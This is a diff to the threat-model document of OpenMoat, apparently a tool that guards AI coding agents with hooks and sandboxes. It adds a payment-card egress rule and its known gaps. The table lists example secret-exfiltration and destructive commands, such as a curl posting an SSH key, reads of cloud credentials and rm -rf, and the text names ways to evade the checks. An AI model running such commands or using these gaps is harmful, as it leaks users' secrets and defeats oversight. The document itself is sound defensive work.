@@ -51,7 +51,7 @@ sandboxes and `openmoat run` add today, or the planned answer from the
 
 | # | Class | Hook | OS layer |
 |---|---|---|---|
-| T1 | Secret exfiltration via shell (`curl -d @~/.ssh/id_rsa …`) | `secrets-paths` denies reads and writes of secret paths, also through `cd`, relative operands, glob operands, `~name`, symlinks and nested shells; unlisted hosts are denied by `default.net`; a known kind of token or a brokered secret's placeholder sent to a host that is not its own is denied by `token-egress` and `placeholder-egress`, allowed hosts included; a read of a folder that holds denied paths (`cp -r ~/.codex x`, `grep -r . ~/.gemini`, `tar czf a.tgz ~/.docker`) asks (`protected-contents`, ADR-038), since the classifier sees one read of the folder and the deny names files inside it | No reads of secret paths, network only through a proxy to allowed hosts |
+| T1 | Secret exfiltration via shell (`curl -d @~/.ssh/id_rsa …`) | `secrets-paths` denies reads and writes of secret paths, also through `cd`, relative operands, glob operands, `~name`, symlinks and nested shells; unlisted hosts are denied by `default.net`; a known kind of token or a brokered secret's placeholder sent to a host that is not its own is denied by `token-egress` and `placeholder-egress`, allowed hosts included, and a payment card number sent off the machine by `card-egress` (ADR-052); a read of a folder that holds denied paths (`cp -r ~/.codex x`, `grep -r . ~/.gemini`, `tar czf a.tgz ~/.docker`) asks (`protected-contents`, ADR-038), since the classifier sees one read of the folder and the deny names files inside it | No reads of secret paths, network only through a proxy to allowed hosts |
 | T2 | Secret exfiltration via file tools (`Read ~/.aws/credentials`) | The same path rules for Claude Code `Read`/`Glob`/`Grep`/`LSP`, Cursor `beforeReadFile` and `preToolUse` `Read`/`Grep`/`Glob`, Gemini CLI `read_file`/`read_many_files`/`glob`/`grep_search`/`list_directory`, and MCP path arguments | Only under `openmoat run`: Claude Code's and Cursor's file tools run outside their sandboxes |
 | T3 | Secret exfiltration via the environment (`echo $OPENAI_API_KEY`, `env`) | `env-secrets` denies reads of secret-shaped names; `env-dump` denies argument-less `env`, `printenv`, `set`, `export`, `declare`, `typeset`, and inline interpreter code that reads the whole environment (an alias such as `e = os.environ` is not followed, §5) | *Planned:* a scrubbed environment |
 | T4 | Destructive git and filesystem operations | `destructive` denies force pushes in every spelling, remote branch deletion, `reset --hard`, `clean -fdx`, `stash drop/clear`, `rm -rf` of `/` and `~`, `sudo`, `mkfs`, `dd if=`; `branch -D`, which the reflog undoes, asks (`destructive-recoverable`); a recursive `rm` that may reach the project root or beyond and discarding checkouts are not allowed, so they defer to the agent's own prompt (ADR-025) | Writes outside the project and the temp directory never reach the disk: refused on macOS, made in an in-memory home that is discarded on Linux ([SANDBOX.md](SANDBOX.md)); inside the project only the hook decides |
@@ -383,6 +383,15 @@ something OpenMoat claims to stop.
   (and generic `Authorization: Bearer` values) pass. A token sent to its own service is
   not checked, whatever account it belongs to; a self-hosted GitLab or GitHub Enterprise
   server is not the service's host, so a token sent there is denied.
+- **Personal data is checked in the same text, and only two shapes of it.**
+  `card-egress` denies a payment card number (a card brand's prefix and length, Luhn
+  valid) going anywhere but this machine, allowed hosts included; ten or more mail
+  addresses in one send become an atom no default rule names (POLICY.md §4.4,
+  ADR-052). It has the token check's blind spots (uploaded files, here-documents,
+  variables, MCP arguments other than URLs) and sees no encoded, compressed or split
+  number, so it stops an agent sending a number as it is, not a determined
+  exfiltration. Published processor test numbers pass on purpose; names, postal
+  addresses, phone numbers and national ids are not checked.
 - **Session taint is minimal.** It follows host tool calls only. `openmoat run`'s proxy
   applies it to the run's connections (ADR-027): after a hook-visible call of a linked
   agent session read secret material, a request to any host but that secret's own is
